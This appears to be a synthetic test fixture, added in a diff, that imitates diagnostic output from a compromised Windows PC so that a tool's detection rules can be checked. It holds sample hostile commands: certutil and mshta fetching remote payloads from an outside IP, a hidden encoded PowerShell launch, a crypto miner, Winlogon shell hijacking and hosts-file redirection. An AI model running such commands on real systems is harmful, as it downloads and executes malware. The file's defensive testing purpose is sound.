@@ -1,0 +1,67 @@
+=== SYNTHETIC TEST FIXTURE - NOT REAL DATA ===
+This file is fake output from a deliberately "infected" machine. Load it with
+Board > Load file, then press Analyze, to prove the detection rules work
+without needing anything actually wrong with your PC.
+
+Windows IP Configuration
+   DNS Servers . . . . . . . . . . . : 45.13.99.7
+                                       192.168.1.1
+
+Active Connections
+  Proto  Local Address          Foreign Address        State           PID
+  TCP    0.0.0.0:4444           0.0.0.0:0              LISTENING       6612
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       880
+  TCP    192.168.1.24:51122     104.18.32.115:443      ESTABLISHED     9120
+  TCP    192.168.1.24:51123     104.18.32.115:443      ESTABLISHED     9120
+  TCP    192.168.1.24:51188     185.222.58.10:8081     ESTABLISHED     6612
+  TCP    127.0.0.1:5040         0.0.0.0:0              LISTENING       3312
+
+Interface: 192.168.1.24 --- 0x5
+  Internet Address      Physical Address      Type
+  192.168.1.1           aa-bb-cc-dd-ee-ff     dynamic
+  192.168.1.77          aa-bb-cc-dd-ee-ff     dynamic
+  192.168.1.90          11-22-33-44-55-66     dynamic
+
+RealTimeProtectionEnabled : False
+BehaviorMonitorEnabled : False
+DisableRealtimeMonitoring : True
+ExclusionPath      : C:\Users\test\AppData\Local\Temp; C:\Games
+AntivirusSignatureLastUpdated : 3/2/2026 4:11:02 AM
+
+Domain Profile Settings:
+State                                 OFF
+
+Shell : explorer.exe,C:\Users\test\AppData\Roaming\svhost.exe
+Userinit : C:\Windows\system32\userinit.exe,
+
+  OneDrive                       "C:\Program Files\Microsoft OneDrive\OneDrive.exe" /background
+  UpdaterTask                    wscript.exe C:\Users\test\AppData\Roaming\run.vbs
+
+ActiveScriptEventConsumer   __EventConsumer
+
+ProcessId Name            CommandLine
+6612      powershell.exe  powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA
+9120      chrome.exe      "C:\Program Files\Google\Chrome\Application\chrome.exe"
+3312      miner.exe       C:\Users\test\AppData\Local\Temp\miner.exe --pool stratum+tcp://x
+1044      cmd.exe         certutil -urlcache -split -f http://185.222.58.10/p.exe p.exe
+2280      mshta.exe       mshta http://185.222.58.10/a.hta
+
+fDenyTSConnections : 0
+AutoConfigURL : http://185.222.58.10/wpad.dat
+
+# HOSTS FILE
+127.0.0.1       localhost
+0.0.0.0         www.update.microsoft.com
+93.184.216.34   my-bank-login.example
+
+Status       Signer   Path
+NotSigned             C:\Users\test\AppData\Roaming\svhost.exe
+HashMismatch          C:\Windows\System32\drivers\xyz.sys
+
+HealthStatus : Unhealthy
+Invoice.pdf.exe
+
+An account failed to log on
+An account failed to log on
+An account failed to log on
